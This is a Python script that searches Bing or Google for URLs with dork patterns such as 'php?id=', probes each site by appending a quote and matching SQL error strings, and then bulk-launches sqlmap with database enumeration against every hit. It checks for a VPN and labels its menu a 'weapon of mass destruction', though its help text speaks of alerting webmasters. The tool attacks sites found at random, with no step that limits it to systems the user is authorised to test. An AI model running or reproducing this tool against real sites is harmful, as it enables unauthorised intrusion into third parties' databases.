#!/usr/bin/python python3
#
# Python script for finding websites which are prone to SQL injections
# Do crawling on bing or google for possible vuln urls
# Check url with qoute ' and catch error messages
# Run sqlmap against urls
#


import sys                          # Quit the shiat
import os                           # Working with files and starting sqlmap
import re                           # Searching web results for vuln
import requests                     # Calling websites
import urllib.parse                 # Parsing url encoding for search
import shutil                       # Checking if SQLmap is installed
import subprocess                   # Used for running SQLmap
import shlex                        # Used for splitting arguments
import psutil                       # Checking possible VPN connection
import http.client                  # Ping to check network connection
from time import sleep              # Multiple use cases, e.g. sleep between requests
from bs4 import BeautifulSoup       # Working with website date


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ITALIC = '\x1B[3m'


# Variables which needs to be defined
filenameRawUrl = "0"
filenameVulnUrl = "0"


def inputSearchUrls():
    
    print("\n" + bcolors.HEADER)
    print("  #===================================#")
    print("  #                                   #")
    print("  # Find urls which might is vuln for #")
    print("  #          SQL injections           #")
    print("  #                                   #")
    print("  #===================================#")
    print("\n" + bcolors.ENDC)
    print("  Basesearch could be: php?id=, php?cat=, e.g.\n")

    #=================================
    # Base input
    #=================================
    
    # @type  basesearch: str
    # @param basesearch: Query string. Must NOT be url-encoded.
    basesearch = input("  Enter base search string: " + bcolors.OKBLUE)
    
    # @type  searchprovider: str
    # @param searchprovider: Who should perform the search.
    searchprovider = input(bcolors.ENDC + "  Bing or Google (b/g): " + bcolors.OKBLUE)
    if searchprovider not in ('b', 'g'):
        print(bcolors.WARNING + "  - Wrong input - only 'b' and 'g' allowed. Using 'b'")
        searchprovider = 'b'
        
    # @type  maxperpage: int/str (changed to string)
    # @param maxperpage: Max results returned per page
    maxperpage = input(bcolors.ENDC + "  Results per page: " + bcolors.OKBLUE)
    if not maxperpage.isdigit():
        print(bcolors.WARNING + "  - Wrong input - only numeric values allowed. Using 20")
        maxperpage = 20
        
    # @type  maxpages: int
    # @param maxpages: Max pages to loop through
    maxpages = input(bcolors.ENDC + "  Number of pages: " + bcolors.OKBLUE)
    if not maxpages.isdigit():
        print(bcolors.WARNING + "  - Wrong input - only numeric values allowed. Using 10")
        maxpages = 10
        
    # @type  startpage: int
    # @param startpage: First page to look in
    startpage = input(bcolors.ENDC + "  Start pages: " + bcolors.OKBLUE)
    if not startpage.isdigit():
        print(bcolors.WARNING + "  - Wrong input - only numeric values allowed. Using 0")
        startpage = 0
    if int(startpage) > 0:
        startpage = (int(startpage) - 1)
        
    # @type  timeout: int
    # @param timeout: Sleep between request
    timeout = input(bcolors.ENDC + "  Enter pause between requests: " + bcolors.OKBLUE)
    if not timeout.isdigit():
        print(bcolors.WARNING + "  - Wrong input - only numeric values allowed. Using 6")
        timeout = 6
        
    # @type  savesearch: str
    # @param savesearch: Save the shiat to a file
    savesearch = input (bcolors.ENDC + "  Save search (y/N): " +  bcolors.OKBLUE)
    if savesearch not in ('', 'y', 'n'):
        print(bcolors.WARNING + "  - Wrong input - only 'y' and 'n' allowed. Using 'n'")
        savesearch = 'n'
        
    # @type  filename: str
    # @param filename: Filename for file containing the search results
    if savesearch == "y":
        filename = input (bcolors.ENDC + "  Filename for search: " +  bcolors.OKBLUE)
        if not os.path.isfile(filename):
            os.mknod(filename)
        else:
            appendtofile = input (bcolors.ENDC + "  File exists, append (Y/n): " +  bcolors.OKBLUE)
            if appendtofile == "n":
                print(bcolors.WARNING + "  - User disallowed appending to resultfile")
                print(bcolors.WARNING + "  - Please try again with another filename")
                print(bcolors.WARNING + "  - Exiting")
                sys.exit()
    else:
        filename = ""
    
    
    #=================================
    # Make variables ready to use
    #=================================
    count = str(maxperpage)
    startpage = int(startpage)
    pages = (int(maxpages) + startpage)
    sleeptime = int(timeout)
    string = str(basesearch)
    stringurl = urllib.parse.quote_plus(string)
    
    print(bcolors.ENDC + "\n  [*]:: Searching")
    print(bcolors.HEADER + bcolors.BOLD + "\n" +
        "  [+]  Results" + bcolors.ENDC)
    
    searchUrlForString(searchprovider, count, startpage, pages, sleeptime, string, stringurl, savesearch, filename)
 
def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, string, stringurl, savesearch, filename):    
    #=================================
    # Loop through pages
    #=================================
    for start in range(startpage,pages):
        #try:
        #=========================
        # Bing search
        #=========================
        if searchprovider == "b":
            pagenr = int(start)*int(count)+1
            address = "http://www.bing.com/search?q=instreamset:(url title):" + stringurl + "&count=" + count + "&first=" + str(pagenr)
            print("  [*]  Page number: " + str(int(start)+1))
            r = requests.get(address)
            soup = BeautifulSoup(r.text, 'lxml')
            for d in soup.find_all('h2'):
                for a in d.find_all('a', href=True):
                    if string in a['href']:
                        print(bcolors.OKGREEN + "  [+]  " + a['href'] + bcolors.ENDC)
                        if savesearch == "y":
                            with open(filename, 'a') as file:
                                file.write(a['href'] + "\n")
                    elif "0.r.msn." in a['href']:
                        pass
                    else:
                        pass
            sleep(sleeptime)   

        #=========================
        # Google search
        #=========================
        elif searchprovider == "g":
            pagenr = int(start)*int(count)
            address = "https://www.google.dk/search?q=" + stringurl + "&num=" + count + "&start=" + str(pagenr)
            #address = "https://www.google.dk/search?q=inurl%3A" + stringurl + "&num=" + count + "&start=" + str(pagenr)
            print("  [*]  Page number: " + str(int(start)+1))
            r = requests.get(address)
            soup = BeautifulSoup(r.text, 'lxml')
            for d in soup.find_all('cite'):
                url = d.text
                if string in url:
                    print(bcolors.OKGREEN + "  [+]  " + url + bcolors.ENDC)
                    if savesearch == "y":
                        with open(filename, 'a') as file:
                            file.write(url + "\n")
            sleep(sleeptime)
        try:
            print("")
    
        #=============================
        # Error, end, exit
        #=============================
        except KeyboardInterrupt:
            print(bcolors.FAIL + "  User input - Ctrl + c" + bcolors.ENDC)
            quitnow = input (bcolors.ENDC + bcolors.BOLD + "    Exit program (y/N): " +  bcolors.OKBLUE)
            if quitnow == "y":
                print(bcolors.ENDC + "  // Exiting\n\n")
                sys.exit()
            else:
                print(bcolors.ENDC + "  // Continuing\n\n")
        except:
            print(bcolors.FAIL + "  ERROR!!! " + bcolors.ENDC)
    
    
    #=================================
    # Done - sum it up
    #=================================
    print("\n  Done scraping")
    if savesearch == "y":
        with open(filename) as f:
            resultsnumber = sum(1 for _ in f)
        print("  Scraping saved in file: " + filename)
        print("  Total saved urls:  " + str(resultsnumber))
        # Check urls? Next function activates..
        checkurls = input (bcolors.ENDC + "\n    Would you like to check urls for vuln (y/N): " +  bcolors.OKBLUE)
        if checkurls == "y":
            checkUrlsForVuln(filename)
        else:    
            print(bcolors.ENDC + "  // Exiting\n\n")
            sys.exit()


def checkUrlsForVuln(filenameRawUrl):
    print("\n\n\n" + bcolors.HEADER)
    print("  #===============================#")
    print("  #                               #")
    print("  #   Check if urls is vuln for   #")
    print("  #         SQL injection         #")
    print("  #                               #")
    print("  #===============================#")
    print("\n" + bcolors.ENDC)
    
    #=================================
    # Base input
    #=================================
    
    # Base input
    if filenameRawUrl != "0":
        print("  Filepath from run is still in memory: " + filenameRawUrl)
        urlfileChoose = input (bcolors.ENDC + "  (I)nput new filename, or (U)se from memory (i/u): " +  bcolors.OKBLUE)
        if urlfileChoose not in ('i', 'u'):
            print(bcolors.WARNING + "  - Wrong input - only 'i' and 'u' allowed. Using 'u'")
            urlfileChoose = 'u'
        if urlfileChoose == 'u':
            urlfile = filenameRawUrl
        else:
            # @type  urlfile: str
            # @param urlfile: File with the raw urls to check.
            urlfile = input (bcolors.ENDC + "  Filename with urls: " +  bcolors.OKBLUE)
    else:
        # @type  urlfile: str
        # @param urlfile: File with the raw urls to check.
        urlfile = input (bcolors.ENDC + "  Filename with urls: " +  bcolors.OKBLUE)
    
    if not os.path.isfile(urlfile):
        print(bcolors.FAIL + "  Specified file does not exist.")
        print(bcolors.FAIL + "  Exiting")
        sys.exit()
    
    # @type  verboseactive: int
    # @param verboseactive: Verboselevel.
    verboseactive = input (bcolors.ENDC + "  Verboselevel (0, 1, 2): " +  bcolors.OKBLUE)
    
    # @type  savesearch: str
    # @param savesearch: Save the scan to file.
    savesearch = input (bcolors.ENDC + "  Save search (y/N): " +  bcolors.OKBLUE)
    
    # @type  filename: str
    # @param filename: Filename for the shiat.
    if savesearch == "y":
        filename = input (bcolors.ENDC + "  Filename for results: " +  bcolors.OKBLUE)
        if not os.path.isfile(filename):
            os.mknod(filename)
        else:
            appendtofile = input (bcolors.ENDC + "  File exists, append (Y/n): " +  bcolors.OKBLUE)
            if appendtofile == "n":
                print("  User disallowed appending to resultfile")
                print("  Please try again with another filename")
                print("  Exiting")
                sys.exit()
    else:
        filename = "0"
    
    print(bcolors.ENDC + "\n  [*]::Reading file\n")
    print("  [*]  Connecting\n")
    
    #=================================
    # Loop through urls and add a qoute
    #=================================
    
    with open(urlfile) as fileorg:
        
        for line in fileorg:
            checkMY1 = 0
            checkMY2 = 0
            checkMY3 = 0
            checkMY4 = 0
            checkMS1 = 0
            checkMS2 = 0
            checkMS3 = 0
            checkOR1 = 0
            checkOR2 = 0
            checkOR3 = 0
            checkPO1 = 0
            checkPO2 = 0
            try:
                # Get data
                url = line + "'"
                print("  [*]  " + line.strip('\n'))
                r = requests.get(url)
                soup = BeautifulSoup(r.text, 'lxml')

                # Check if vuln
                # MySQL
                checkMY1 = len(soup.find_all(text=re.compile('check the manual that corresponds to your MySQL')))
                checkMY2 = len(soup.find_all(text=re.compile('SQL syntax')))
                checkMY3 = len(soup.find_all(text=re.compile('server version for the right syntax')))
                checkMY4 = len(soup.find_all(text=re.compile('expects parameter 1 to be')))
                # Microsoft SQL server
                checkMS1 = len(soup.find_all(text=re.compile('Unclosed quotation mark before the character string')))
                checkMS2 = len(soup.find_all(text=re.compile('An unhanded exception occurred during the execution')))
                checkMS3 = len(soup.find_all(text=re.compile('Please review the stack trace for more information')))
                # Oracle Errors
                checkOR1 = len(soup.find_all(text=re.compile('java.sql.SQLException: ORA-00933')))
                checkOR2 = len(soup.find_all(text=re.compile('SQLExceptionjava.sql.SQLException')))
                checkOR3 = len(soup.find_all(text=re.compile('quoted string not properly terminated')))
                # Postgre SQL
                checkPO1 = len(soup.find_all(text=re.compile('Query failed:')))
                checkPO2= len(soup.find_all(text=re.compile('unterminated quoted string at or near')))
                
                # Verbose level 1
                if verboseactive == "1":
                    print("  [V]  Check1 MySQL found:    " + str(checkMY1))
                    print("  [V]  Check2 MySQL found:    " + str(checkMY2))
                    print("  [V]  Check3 MySQL found:    " + str(checkMY3))
                    print("  [V]  Check4 MySQL found:    " + str(checkMY4))
                    print("  [V]  Check5 MS SQL found:   " + str(checkMS1))
                    print("  [V]  Check6 MS SQL found:   " + str(checkMS2))
                    print("  [V]  Check7 MS SQL found:   " + str(checkMS3))
                    print("  [V]  Check8 Oracle found:   " + str(checkOR1))
                    print("  [V]  Check9 Oracle found:   " + str(checkOR2))
                    print("  [V]  Check10 Oracle found:  " + str(checkOR3))
                    print("  [V]  Check11 Postgre found: " + str(checkPO1))
                    print("  [V]  Check12 Postgre found: " + str(checkPO2))
                    
                # Verbose level 2
                if verboseactive == "2":
                    checkverMY1 = soup.find(text=re.compile('check the manual that corresponds to your MySQL'))
                    checkverMY2 = soup.find(text=re.compile(r'SQL syntax'))
                    checkverMY3 = soup.find(text=re.compile(r'server version for the right syntax'))
                    checkverMY4 = soup.find(text=re.compile('expects parameter 1 to be'))
                    print("  [V]  Check1 MySQL found:    " + str(checkverMY1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("  [V]  Check2 MySQL found:    " + str(checkverMY2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("  [V]  Check3 MySQL found:    " + str(checkverMY3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("  [V]  Check4 MySQL found:    " + str(checkverMY4).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    
                    checkverMS1 = soup.find(text=re.compile('Unclosed quotation mark before the character string'))
                    checkverMS2 = soup.find(text=re.compile('An unhanded exception occurred during the execution'))
                    checkverMS3 = soup.find(text=re.compile('Please review the stack trace for more information'))
                    print("  [V]  Check5 MS SQL found:   " + str(checkverMS1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("  [V]  Check6 MS SQL found:   " + str(checkverMS2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("  [V]  Check7 MS SQL found:   " + str(checkverMS3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    
                    checkverOR1 = soup.find(text=re.compile('java.sql.SQLException: ORA-00933'))
                    checkverOR2 = soup.find(text=re.compile('SQLExceptionjava.sql.SQLException'))
                    checkverOR3 = soup.find(text=re.compile('quoted string not properly terminated'))
                    print("  [V]  Check8 Oracle found:   " + str(checkverOR1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("  [V]  Check9 Oracle found:   " + str(checkverOR2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("  [V]  Check10 Oracle found:  " + str(checkverOR3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))

                    checkverPO1 = soup.find(text=re.compile('Query failed:'))
                    checkverPO2 = soup.find(text=re.compile('unterminated quoted string at or near'))
                    print("  [V]  Check11 Postgre found: " + str(checkverPO1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                    print("  [V]  Check12 Postgre found: " + str(checkverPO2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
                
                # If X is vuln
                if (checkMY1 > 0 or checkMY2 > 0 or checkMY3 > 0 or checkMY4 > 0 or checkMS1 > 0 or checkMS2 > 0 or checkMS3 > 0 or checkOR1 > 0 or checkOR2 > 0 or checkOR3 > 0 or checkPO1 > 0 or checkPO2):
                    print(bcolors.OKGREEN + "  [+]  " + line + bcolors.ENDC)
                    if savesearch == "y":
                        with open(filename, 'a') as file:
                            file.write(line)
                else:
                    print(bcolors.WARNING + "  [-]  " + line + bcolors.ENDC)
            
            # Skip X or/and exit
            except KeyboardInterrupt:
                print(bcolors.FAIL + "  [X]  " + line + bcolors.ENDC)
                quitnow = input (bcolors.ENDC + bcolors.BOLD + "  Exit program (y/N): " +  bcolors.OKBLUE)
                if quitnow == "y":
                    print(bcolors.ENDC + "  // Exiting\n\n")
                    sys.exit()
                else:
                    print(bcolors.ENDC + "  // Continuing\n\n")
                    
            # Bad X
            except:
                print(bcolors.FAIL + "  [X]  " + line + bcolors.ENDC)
               
               
    #=================================
    # Done - sum it up
    #=================================
    print("\n  Done scanning urls")
    if savesearch == "y":
        with open(filename) as f:
            resultsnumber = sum(1 for _ in f)
        print("  Scraping saved in file: " + filename)
        print("  Total saved urls:  " + str(resultsnumber))
        if resultsnumber == 0:
            print("  No vuln urls, exiting\n\n")
            sys.exit()
    checkurls = input (bcolors.ENDC + "\n  Would you like to check urls for vuln (y/N): " +  bcolors.OKBLUE)
    if checkurls == "y":
        scanUrlsSQLmap(filename)
    else:    
        print(bcolors.ENDC + "  // Exiting\n\n")
        sys.exit()


def scanUrlsSQLmap(filenameVulnUrl):
    
    print("\n\n\n" + bcolors.HEADER)
    print("  #===============================#")
    print("  #                               #")
    print("  #        Scan urls with         #")
    print("  #            SQLmap             #")
    print("  #                               #")
    print("  #===============================#")
    print("\n" + bcolors.ENDC)
    
    #=================================
    # Check if sqlmap installed, file, etc.
    #=================================
    
    if shutil.which('sqlmap') is None:
        print("  SQLmap is not installed on system - can't go on.")
        print("  Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)")
        print("  \nCommand:")
        print("  sqlmap -m \"" + filenameVulnUrl + "\n")
    else:
        if filenameVulnUrl == "0":
            print("  No filename in memory, please specify.")
            # @type  urlfile: str
            # @param urlfile: File with the raw urls to check.
            filenameVulnUrl = input (bcolors.ENDC + "  Filename with urls: " +  bcolors.OKBLUE)
            if not os.path.isfile(filenameVulnUrl):
                print(bcolors.FAIL + "  Specified file does not exist.")
                print(bcolors.FAIL + "  Exiting")
                sys.exit()
    
    print(bcolors.ENDC + "  SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.")

    fileDestination = (os.getcwd() + "/" + filenameVulnUrl)
    command = ('sqlmap -m ' + fileDestination + " --dbs --batch --random-agent --threads 4")
    print("Command to execute: " + command)
    
    input (bcolors.ENDC + "  Press enter to continue\n")
    print(bcolors.ENDC + "  Starting SQLmap - follow onscreen instructions")
    print(bcolors.BOLD + "  Press Ctrl + c to exit\n\n\n")
    
    # RUN SQLMAP !!
    os.system(command)
    
    # Not implemented - specify saving destination    
    # @type  savingplace: str
    # @param savingplace: Who should perform the search.
    #savingplace = input(bcolors.ENDC + "  Specify folder where results will be placed: " + bcolors.OKBLUE)
    #if savingplace not in ('b', 'g'):
    #    print(bcolors.WARNING + "  - Wrong input - only 'b' and 'g' allowed. Using 'b'")
    #    savingplace = 'b'    
            

def helpme():
    print("\n\n" + bcolors.HEADER)
    print("  .---.  .---.     .-''-.    .---.     .-------.         ,---.    ,---.    .-''-.   ")
    print("  |   |  |_ _|   .'_ _   \   | ,_|     \  _(`)_ \        |    \  /    |  .'_ _   \  ")
    print("  |   |  ( ' )  / ( ` )   ',-./  )     | (_ o._)|        |  ,  \/  ,  | / ( ` )   ' ")
    print("  |   '-(_{;}_). (_ o _)  |\  '_ '`)   |  (_,_) /        |  |\_   /|  |. (_ o _)  | ")
    print("  |      (_,_) |  (_,_)___| > (_)  )   |   '-.-'         |  _( )_/ |  ||  (_,_)___| ")
    print("  | _ _--.   | '  \   .---.(  .  .-'   |   |             | (_ o _) |  |'  \   .---. ")
    print("  |( ' ) |   |  \  `-'    / `-'`-'|___ |   |             |  (_,_)  |  | \  `-'    / ")
    print("  (_{;}_)|   |   \       /   |        \/   )             |  |      |  |  \       /  ")
    print("  '(_,_) '---'    `'-..-'    `--------``---'             '--'      '--'   `'-..-'   ")
    print("\n\n" + bcolors.ENDC)
    print("  This python script is developed to show, how many vulnerables websites,")
    print("  which are laying around on the web. The main focus of the script is to")
    print("  generate a list of vuln urls. Please use the script with causing and")
    print("  alert the webadmins of vulnerable pages. The SQLmap implementation is")
    print("  just for showcasing.")
    print("")
    print("  The script is divided into 3 main sections.\n")
    print(bcolors.BOLD + "  # Section 1" + bcolors.ENDC)
    print("    In this section you have to provide a search string, which 'connects' to")
    print("    the websites database, e.g. 'php?id='. The script then crawls")
    print("    Bing or Google for urls containing it. All of the urls can then be saved")
    print("    into a file. (Please be aware that you might get banned for crawling to")
    print("    fast, remember an appropriate break/sleep between request).")
    print(bcolors.ITALIC + "    Example of searchs: php?bookid=, php?idproduct=, php?bookid=, php?catid=,")
    print("                        php?action=, php?cart_id=, php?title=, php?itemid=" + bcolors.ENDC)
    print("")
    print(bcolors.BOLD + "  # Section 2" + bcolors.ENDC)
    print("    This section adds a qoute ' to the websites url. If the website is")
    print("    prone to SQL injection, we'll catch this with some predefined error")
    print("    messages. The script will not add websites for blind SQL injections,")
    print("    due to the predefined error messages.")
    print("")
    print(bcolors.BOLD + "  # Section 3" + bcolors.ENDC)
    print("    This is just an activation of sqlmap with the bulk argument and no")
    print("    user interaction for validation of SQL injection.")
    print("")
    print("  If you choose to save the results, the script will automate the") 
    print("  process throughout the sections.")
    print("\n")
    print(bcolors.BOLD + "      Stay safe and help the vulnerables" + bcolors.ENDC)
    print("\n")
    sys.exit()
    

def checkConnection():
    # Header request for net connectivity
    print(bcolors.ENDC + "\n  [*]  Checking network connection" + bcolors.ENDC)
    conn = http.client.HTTPConnection("www.microsoft.com", 80)
    try:
        conn.request("HEAD", "/")
        print(bcolors.OKGREEN + "  [+]  Network connection seems OK" + bcolors.ENDC)
    except:
        print(bcolors.FAIL + "  [-]  Network connection seems down" + bcolors.ENDC)
    
    # Checking for tun0 or ppp
    print(bcolors.ENDC + "  [*]  Checking VPN connection" + bcolors.ENDC)
    if re.match(r'tun.', 'tun') and re.match(r'ppp.', 'ppp') not in psutil.net_if_addrs():
        print(bcolors.WARNING + "  [-]  No indication of a VPN connection on tun or ppp found.")
        choice = input(bcolors.ENDC + "  Continue (y/N): " + bcolors.OKBLUE)
        if choice == "y":
            print(bcolors.ENDC + "  Continuing\n")
        else:
            sys.exit()
    else:
        print(bcolors.OKGREEN + "  [+]  Indications of a VPN. Good. Will continue." + bcolors.ENDC)
        
    startpage()


def startpage():
    print("\n")
    print(bcolors.BOLD + "  Please choose your weapon of mass destruction:")
    print(bcolors.BOLD + "    1" + bcolors.ENDC + " - Scrape the web for possible vuln urls")
    print(bcolors.BOLD + "    2" + bcolors.ENDC + " - Check the urls for vulnerabilities")
    print(bcolors.BOLD + "    3" + bcolors.ENDC + " - Bulk exploit urls with sqlmap")
    print(bcolors.BOLD + "    4" + bcolors.ENDC + " - Help me")
    print("\n")
    # @type  choice: str
    # @param choice: Weapon of massdestruction
    choice = input(bcolors.ENDC + "  Enter choice numer (1, 2, 3, 4): " + bcolors.OKBLUE)
    if not choice.isdigit():
        print(bcolors.WARNING + "  - Wrong input - only 1, 2, 3 and 4 allowed")
        print("  - Exiting\n")
        sys.exit()
    if choice not in ('1', '2', '3', '4'):
        print(bcolors.WARNING + "  - Wrong input - only 1, 2, 3 and 4 allowed")
        print("  - Exiting\n")
        sys.exit()
        
    if choice == "1":
        inputSearchUrls()
    elif choice == "2":
        checkUrlsForVuln(filenameRawUrl)
    elif choice == "3":
        scanUrlsSQLmap(filenameVulnUrl)
    elif choice == "4":
        helpme()

    
def main():
    os.system('clear') 
    print("\n\n")
    print("      _____           __   _____ ____    __       _         _           __  _           ")
    print("     / __(_)___  ____/ /  / ___// __ \  / /      (_)___    (_)__  _____/ /_(_)___  ____ ")
    print("    / /_/ / __ \/ __  /   \__ \/ / / / / /      / / __ \  / / _ \/ ___/ __/ / __ \/ __ |")
    print("   / __/ / / / / /_/ /   ___/ / /_/ / / /___   / / / / / / /  __/ /__/ /_/ / /_/ / / / /")
    print("  /_/ /_/_/ /_/\__,_/   /____/\___\_\/_____/  /_/_/ /_/_/ /\___/\___/\__/_/\____/_/ /_/ ")
    print("                                                     /___/                              ")
    print("\n\n")
    checkConnection()

# GO GO GO
main()
